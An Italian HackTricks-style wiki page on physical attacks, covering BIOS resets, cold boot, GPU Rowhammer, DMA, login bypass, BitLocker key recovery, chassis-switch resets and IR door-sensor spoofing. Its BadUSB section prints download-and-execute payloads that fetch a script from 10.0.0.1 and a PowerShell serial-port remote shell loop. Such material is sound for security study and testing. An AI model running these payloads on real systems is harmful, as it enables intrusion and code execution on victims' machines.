# Attacchi fisici

{{#include ../banners/hacktricks-training.md}}

## Recupero della password del BIOS e sicurezza del sistema

Le impostazioni del firmware dei PC legacy possono essere reimpostate scollegando la batteria CMOS o utilizzando un jumper clear-CMOS documentato. Il tempo necessario con l'alimentazione scollegata dipende dalla scheda e le password o le chiavi dei moderni UEFI possono risiedere nella memoria flash non volatile, in un embedded controller o in un dispositivo di sicurezza, sopravvivendo quindi alla rimozione della batteria. Consultare il manuale della scheda o di manutenzione prima di cortocircuitare i pin; questa procedura può inoltre invalidare le misurazioni del TPM e attivare il ripristino della cifratura del disco.

Sui sistemi x86 legacy, strumenti come **killCMOS** e **CmosPwd** possono ispezionare o modificare le impostazioni memorizzate nel CMOS da un ambiente avviabile. CmosPwd riconosce i formati delle password di un insieme documentato di famiglie di BIOS meno recenti e può eseguire il backup, il ripristino o la cancellazione/eliminazione dello stato del CMOS; le sue build pubblicate sono destinate ad ambienti legacy DOS/Windows, Linux, FreeBSD e NetBSD.<sup>[[18]](#references)</sup> Queste utility non sono strumenti generici per rimuovere le password UEFI e richiedono un accesso sufficiente all'hardware e al firmware.

Alcuni firmware dei laptop visualizzano un codice di sfida specifico del vendor dopo diversi tentativi di password falliti. Database come [bios-pw.org](https://bios-pw.org) possono ricavare password di ripristino legacy del vendor per alcuni modelli, ma molti sistemi implementano un blocco senza un codice di sfida derivabile. Considerare qualsiasi password generata come specifica del modello ed evitare di esaurire i contatori permanenti dei tentativi.

### Sicurezza UEFI

Per i moderni sistemi **UEFI**, CHIPSEC può verificare le protezioni delle variabili Secure Boot. Iniziare con il controllo che non apporta modifiche riportato di seguito; la modalità opzionale `-a modify` tenta deliberatamente di corrompere le variabili e deve essere utilizzata solo su un sistema di laboratorio ripristinabile. CHIPSEC avverte inoltre che il suo driver privilegiato e l'accesso hardware a basso livello non sono adatti agli endpoint di produzione.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Analisi della RAM e attacchi Cold Boot

La DRAM non perde immediatamente ogni bit quando il refresh si interrompe. Il tasso di decadimento varia sostanzialmente in base alla tecnologia del modulo e alla temperatura; il raffreddamento può preservare dati utili molto più a lungo rispetto a un ciclo di alimentazione non raffreddato. Un attacco cold-boot riavvia rapidamente il sistema in un ambiente di acquisizione ridotto oppure trasferisce un modulo raffreddato, cattura la memoria grezza e ricostruisce le chiavi crittografiche nonostante il decadimento dei bit. Un'utilità per copiare dischi non è automaticamente uno strumento per creare immagini della memoria fisica, e Volatility analizza una cattura invece di acquisirla; utilizzare uno strumento di acquisizione appropriato per la piattaforma e validato.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer contro le tabelle delle pagine

I moderni attacchi GPU Rowhammer diventano molto più utili quando prendono di mira i **metadati della memoria virtuale della GPU** invece dei normali buffer. Ricerche recenti sulle **GPU NVIDIA Ampere con GDDR6** mostrano che un attaccante che esegue codice CUDA senza privilegi può creare pattern di hammering specifici per la GPU, usare il **memory massaging** per collocare le strutture di paging in righe vulnerabili e quindi alterare bit nella **tabella delle pagine di ultimo livello** o in una **directory delle pagine** intermedia. Una volta corrotta una singola voce di traduzione, l'attaccante può ottenere **lettura/scrittura arbitraria della memoria della GPU** e poi passare alla compromissione dell'host.<sup>[[1]](#references)[[2]](#references)</sup>

### Pattern di sfruttamento

1. **Profilare le righe attaccabili** nella GDDR6 e creare pattern di hammering consapevoli del refresh / non uniformi che eludano le mitigazioni in-DRAM.
2. **Eseguire il memory massaging delle allocazioni GPU** affinché il driver collochi le strutture di traduzione delle pagine in posizioni fisiche attaccabili invece di mantenerle nel pool protetto predefinito. In pratica, ciò può significare esaurire la regione a bassa memoria delle tabelle delle pagine e distribuire grandi mapping UVM sparsi con stride controllati.
3. **Alterare i metadati di traduzione** come **PFN** o i bit relativi all'apertura, all'interno di una voce di tabella delle pagine / directory delle pagine, in modo che la pagina virtuale controllata dall'attaccante venga risolta in pagine delle tabelle delle pagine, memoria GPU arbitraria o mapping di sistema visibili all'host.
4. Riutilizzare il mapping contraffatto per riscrivere ulteriori voci di traduzione ed eseguire un'escalation fino alla **lettura/scrittura arbitraria della memoria GPU** tra i contesti GPU.

### Pivot verso l'host e mitigazioni

- Con **IOMMU disabilitato**, i mapping contraffatti dell'apertura di sistema possono esporre memoria fisica arbitraria dell'**host** alla GPU, trasformando la primitiva GPU in una compromissione completa dell'host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** prende di mira le voci delle tabelle delle pagine di ultimo livello, mentre **GeForge** mostra che corrompere un livello di directory delle pagine può essere più semplice, perché un singolo bit flip può reindirizzare un sottoalbero di traduzione più ampio. Non considerare critico per la sicurezza un solo livello di paging.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** rimane importante perché blocca il percorso diretto verso la memoria arbitraria dell'host utilizzato da GDDRHammer/GeForge, ma **non costituisce una mitigazione completa**. **GPUBreach** mostra un pivot di seconda fase in cui l'attaccante corrompe buffer CPU scrivibili dalla GPU e di proprietà del driver, quindi attiva bug di memory safety nel driver NVIDIA per ottenere una primitiva di scrittura nel kernel e una **root shell** anche con IOMMU abilitato.<sup>[[3]](#references)</sup>
- L'**ECC a livello di sistema** è una misura pratica di hardening sulle GPU workstation/server supportate. Le GPU consumer senza ECC espongono una superficie di difesa più debole.<sup>[[4]](#references)</sup>
- Questi attacchi non sono puramente teorici: **GeForge** ha riportato **1.171** bit flip su una RTX 3060 e **202** su una RTX A6000, sufficienti per creare una catena funzionante di escalation dei privilegi sull'host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attacchi Direct Memory Access (DMA)

**Inception** dimostra l'acquisizione e il patching della memoria basati su **DMA** tramite interfacce come FireWire e le prime configurazioni Thunderbolt, comprese firme storiche di bypass del login. Non è semplicemente “inefficace contro Windows 10”: la sfruttabilità dipende dall'interfaccia, dalla build target, dai criteri IOMMU, dallo stato di blocco e dal fatto che Windows Kernel DMA Protection sia supportato e abilitato. Windows 10 versione 1803 e successive ha introdotto Kernel DMA Protection sulle piattaforme compatibili, modificando sostanzialmente la superficie di attacco.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB per l'accesso al sistema

Su un volume Windows non crittografato o già sbloccato, un ambiente offline può sostituire i binari di accessibilità come **sethc.exe** o **Utilman.exe** con **cmd.exe**, ottenendo un prompt dei comandi SYSTEM quando viene eseguita la scorciatoia corrispondente nella schermata di accesso. Strumenti come **chntpw** possono modificare i dati degli account locali nel SAM. Questi metodi non eludono un volume BitLocker bloccato e possono danneggiare le credenziali protette con DPAPI/EFS; conservare copie forensi e backup.

**Kon-Boot** è uno strumento commerciale di bypass dell'autenticazione al boot per configurazioni Windows/macOS supportate. La compatibilità dipende dal sistema operativo, dalla modalità firmware, da Secure Boot e dalla configurazione della crittografia del disco; non decritta un volume bloccato con BitLocker.<sup>[[10]](#references)</sup>

---

## Gestione delle funzionalità di sicurezza di Windows

### Scorciatoie di boot e ripristino

- **Delete/Supr**, F2, F10 o un altro tasto del produttore possono aprire la configurazione del firmware.
- **F8** accede alle opzioni avanzate di boot legacy di Windows solo nelle configurazioni in cui tale percorso rimane abilitato; l'accesso al ripristino attuale varia.
- Tenere premuto **Shift** può impedire il login automatico di Windows in alcune configurazioni, sebbene i criteri e le impostazioni del registro possano disabilitare questo comportamento.<sup>[[17]](#references)</sup>

### Dispositivi BAD USB

Dispositivi come **USB Rubber Ducky** e le schede Teensy possono enumerarsi come tastiere HID attendibili e iniettare sequenze di tasti predefinite. Il payload inizialmente dispone dei privilegi e dell'accesso al desktop della sessione connessa; i prompt UAC, il blocco dello schermo, il layout della tastiera, la temporizzazione e i criteri USB dell'endpoint continuano a limitarlo.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

I privilegi di amministratore o di backup possono creare una shadow copy o salvare gli hive del registro, consentendo di acquisire file bloccati come **SAM** e **SYSTEM**. Questa è una tecnica di raccolta post-compromissione, non un bypass dei privilegi, e dovrebbe essere correlata agli eventi di `diskshadow`/VSS e di esportazione degli hive del registro.

## Tecniche di impianto BadUSB / HID

### Impianti per cavi gestiti tramite Wi-Fi

- Gli impianti basati su ESP32-S3 come **Evil Crow Cable Wind** si nascondono all'interno di cavi da USB-A→USB-C o USB-C↔USB-C, si enumerano esclusivamente come tastiera USB ed espongono il loro stack C2 tramite Wi-Fi. L'operatore deve solo alimentare il cavo dall'host vittima, creare un hotspot chiamato `Evil Crow Cable Wind` con password `123456789` e visitare [http://cable-wind.local/](http://cable-wind.local/) (o il relativo indirizzo DHCP) per raggiungere l'interfaccia HTTP incorporata.<sup>[[8]](#references)</sup>
- L'interfaccia del browser fornisce schede per *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. I payload memorizzati sono contrassegnati per sistema operativo, i layout della tastiera vengono cambiati al volo e le stringhe VID/PID possono essere alterate per imitare periferiche note.
- Poiché il C2 risiede all'interno del cavo, un telefono può preparare i payload, attivarne l'esecuzione e gestire le credenziali Wi-Fi senza utilizzare la rete dell'organizzazione: una soluzione utile per intrusioni fisiche di breve durata.

### Payload AutoExec consapevoli del sistema operativo

- Le regole AutoExec associano uno o più payload da eseguire immediatamente dopo l'enumerazione USB. L'impianto esegue un fingerprinting leggero del sistema operativo e seleziona lo script corrispondente.
- Flusso di lavoro di esempio:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminale) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Poiché l'esecuzione è automatica, la semplice sostituzione di un cavo di ricarica può consentire un accesso iniziale “plug-and-pwn” nel contesto dell'utente connesso.

### Remote shell bootstrap tramite HID su Wi-Fi TCP

1. **Bootstrap tramite sequenze di tasti:** un payload memorizzato apre una console e incolla un loop che esegue qualsiasi contenuto arrivi sul nuovo dispositivo seriale USB. Una variante Windows minimale è:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** L’impianto mantiene aperto il canale USB CDC mentre il suo ESP32-S3 avvia un client TCP (Python script, Android APK o eseguibile desktop) verso l’operatore. Qualsiasi byte digitato nella sessione TCP viene inoltrato nel loop seriale precedente, consentendo l’esecuzione remota di comandi anche su host air-gapped. L’output è limitato, quindi gli operatori eseguono generalmente comandi alla cieca (creazione di account, preparazione di tooling aggiuntivo, ecc.).

### Superficie di aggiornamento HTTP OTA

- L’interfaccia documentata di Evil Crow Cable Wind espone un endpoint di aggiornamento del firmware non autenticato su `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Gli operatori sul campo possono eseguire il hot-swap delle funzionalità (ad esempio, del firmware flash USB Army Knife) durante un engagement senza aprire il cavo, consentendo all'implant di passare a nuove capacità mentre è ancora collegato all'host target.

## Bypass della crittografia BitLocker

Un'acquisizione forense autorizzata di un sistema attivo o utilizzato di recente può contenere una volume master key di BitLocker o materiale di chiavi correlato mentre il volume è sbloccato. Strumenti commerciali come Elcomsoft Forensic Disk Decryptor e Passware Kit Forensic possono cercare nelle immagini di memoria supportate, nei file di ibernazione o nei crash dump, ma il successo non è garantito. Le versioni moderne di Windows cifrano anche i crash dump quando BitLocker è abilitato, e una recovery password di 48 cifre memorizzata è un artefatto diverso da una volume key presente in memoria.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering per l'aggiunta della recovery key

Un attacker che convince un amministratore a eseguire comandi di gestione di BitLocker può aggiungere una recovery-password, una external-key o un altro protector e poi acquisirlo. Una recovery password non può essere una stringa arbitraria di zeri: le recovery password numeriche di BitLocker devono avere un formato validato di 48 cifre. La sintassi di authorized-administration pertinente è `manage-bde -protectors -add C: -recoverypassword`; elenca i protector risultanti con `manage-bde -protectors -get C:`. Monitora le aggiunte di protector e assicurati che il nuovo materiale di recovery venga sottoposto a escrow solo in posizioni approvate.<sup>[[16]](#references)</sup>

---

## Sfruttamento degli switch di intrusione dello chassis / manutenzione per eseguire il factory reset del BIOS

Molti laptop moderni e desktop small-form-factor includono uno **switch di chassis-intrusion** monitorato dall'Embedded Controller (EC) e dal firmware BIOS/UEFI. Sebbene lo scopo principale dello switch sia generare un alert quando un dispositivo viene aperto, i vendor a volte implementano una **scorciatoia di recovery non documentata** che viene attivata quando lo switch viene commutato secondo uno schema specifico.<sup>[[5]](#references)[[6]](#references)</sup>

### Come funziona l'attacco

1. Lo switch è collegato a un **GPIO interrupt** sull'EC.
2. Il firmware in esecuzione sull'EC tiene traccia della **temporizzazione e del numero di pressioni**.
3. Quando viene riconosciuto uno schema hard-coded, l'EC richiama una routine di *mainboard-reset* che **cancella il contenuto della NVRAM/CMOS del sistema**.
4. Al boot successivo, i modelli interessati caricano lo stato firmware resettato. A seconda del vendor e della revisione, lo stato cancellato può includere una supervisor password, impostazioni di boot personalizzate o chiavi Secure Boot registrate; lo stato del TPM e gli effetti sulla disk-encryption devono essere valutati separatamente.

> Un firmware reset può ripristinare le opzioni di external-boot, ma **non** decritta lo storage. BitLocker o un altro sistema di full-disk encryption può entrare in recovery dopo modifiche al TPM/firmware e continuare a proteggere l'unità interna senza una recovery key.<sup>[[16]](#references)</sup>

### Esempio reale – Laptop Framework 13

La scorciatoia di recovery per il Framework 13 (11th/12th/13th-gen) è:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Dopo il decimo ciclo l'EC imposta un flag che istruisce il BIOS a cancellare la NVRAM al riavvio successivo. L'intera procedura richiede ~40 s e **nient'altro che un cacciavite**.<sup>[[5]](#references)</sup>

### Procedura di Exploitation generica

1. Accendere o sospendere-riattivare il target in modo che l'EC sia in esecuzione.
2. Rimuovere il coperchio inferiore per esporre l'intrusion/maintenance switch.
3. Riprodurre il pattern di toggle specifico del vendor (consultare la documentazione, i forum oppure fare reverse engineering del firmware dell'EC).
4. Rimontare e riavviare, quindi verificare quali impostazioni del firmware e credenziali siano effettivamente cambiate.
5. Se autorizzato e il boot esterno è disponibile, avviare una live image controllata. Una volta che un volume interno è stato legittimamente sbloccato (oppure se non è mai stato cifrato), l'ambiente live può acquisire credenziali e dati o ispezionare la EFI System Partition. Modificare quella partizione per installare un EFI implant è persistente e altamente intrusivo, e rimane limitato da Secure Boot, measured boot, protezione dalla scrittura del firmware e monitoraggio degli endpoint. Lo storage cifrato rimane inaccessibile senza la relativa chiave o il materiale di recovery.

### Rilevamento e Mitigazione

* Registrare gli eventi di chassis-intrusion nella console di gestione del sistema operativo e correlarli con reset imprevisti del BIOS.
* Utilizzare **sigilli antimanomissione** su viti/coperchi per rilevare l'apertura.
* Conservare i dispositivi in **aree fisicamente controllate**; presumere che l'accesso fisico equivalga a una compromissione completa.
* Ove disponibile, disabilitare la funzionalità vendor di “maintenance switch reset” oppure richiedere un'autorizzazione crittografica aggiuntiva per i reset della NVRAM.

---

## Iniezione IR furtiva contro i sensori di uscita No-Touch

### Caratteristiche del sensore
- I sensori commerciali “wave-to-exit” abbinano un emettitore LED near-IR a un modulo ricevitore simile a quello di un telecomando TV, che segnala logic high solo dopo aver rilevato più impulsi (~4–10) della portante corretta (≈30 kHz).<sup>[[7]](#references)</sup>
- Un rivestimento in plastica impedisce all'emettitore e al ricevitore di guardarsi direttamente, quindi il controller presume che qualsiasi portante validata provenga da una riflessione vicina e attiva un relay che apre la serratura della porta.
- Una volta che il controller ritiene presente un target, spesso modifica l'envelope di modulazione in uscita, ma il ricevitore continua ad accettare qualsiasi burst che corrisponda alla portante filtrata.

### Workflow dell'attacco
1. **Acquisire il profilo di emissione** – collegare un analizzatore logico ai pin del controller per registrare sia le forme d'onda precedenti al rilevamento sia quelle successive, che pilotano il LED IR interno.
2. **Riprodurre solo la forma d'onda “post-detection”** – rimuovere/ignorare l'emettitore di serie e pilotare un LED IR esterno con il pattern già attivato fin dall'inizio. Poiché il ricevitore considera solo il numero/la frequenza degli impulsi, tratta la portante spoofata come una riflessione autentica e attiva la linea del relay.
3. **Controllare la trasmissione** – trasmettere la portante in burst calibrati (ad es. decine di millisecondi attivi e altrettanti inattivi) per fornire il numero minimo di impulsi senza saturare l'AGC del ricevitore o la logica di gestione delle interferenze. Un'emissione continua desensibilizza rapidamente il sensore e impedisce l'attivazione del relay.

### Iniezione riflessiva a lunga distanza
- Sostituire il LED da banco con un diodo IR ad alta potenza, un driver MOSFET e ottiche di focalizzazione consente un'attivazione affidabile da ~6 m di distanza.
- L'attaccante non necessita di line-of-sight verso l'apertura del ricevitore; puntare il fascio contro pareti interne, scaffalature o telai delle porte visibili attraverso il vetro consente all'energia riflessa di entrare nel campo visivo di ~30° e simulare un gesto della mano a corto raggio.
- Poiché i ricevitori si aspettano solo riflessioni deboli, un fascio esterno molto più potente può rimbalzare su più superfici rimanendo comunque al di sopra della soglia di rilevamento.

### Attack Torch weaponised
- Integrare il driver all'interno di una torcia commerciale nasconde lo strumento in bella vista. Sostituire il LED visibile con un LED IR ad alta potenza adattato alla banda del ricevitore, aggiungere un ATtiny412 (o simile) per generare i burst a ≈30 kHz e utilizzare un MOSFET per assorbire la corrente del LED.
- Una lente zoom telescopica restringe il fascio per aumentare portata e precisione, mentre un motorino a vibrazione controllato dall'MCU fornisce una conferma aptica che la modulazione è attiva senza emettere luce visibile.
- Alternare diversi pattern di modulazione memorizzati (frequenze della portante ed envelope leggermente differenti) aumenta la compatibilità tra famiglie di sensori rebrandizzati, consentendo all'operatore di passare in rassegna le superfici riflettenti finché il relay scatta udibilmente e la porta si apre.

---

## References

- [1] [GDDRHammer: Disturbare fortemente le righe DRAM — Attacchi Rowhammer cross-component dalle GPU moderne](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Eseguire il forcing della memoria GDDR per forgiare le page table delle GPU per divertimento e profitto](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Attacchi di privilege escalation alle GPU mediante Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Avviso di sicurezza: Rowhammer - luglio 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Premi qui per fare pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guida al reset della mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassare i sensori IR di uscita No-Touch con una torcia IR furtiva”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Collega, avvia, fai pwn: hacking con Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Attacco Rowhammer contro i chip NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentazione ufficiale e informazioni sulla compatibilità di Kon-Boot](https://kon-boot.com/)
- [11] [Documentazione di CHIPSEC - protezioni delle variabili Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: attacchi Cold Boot alle chiavi di cifratura](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipolazione della memoria fisica tramite DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentazione di Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - guida alle operazioni di BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - comportamento della pressione di Shift e dell'accesso automatico](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - documentazione e download di CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
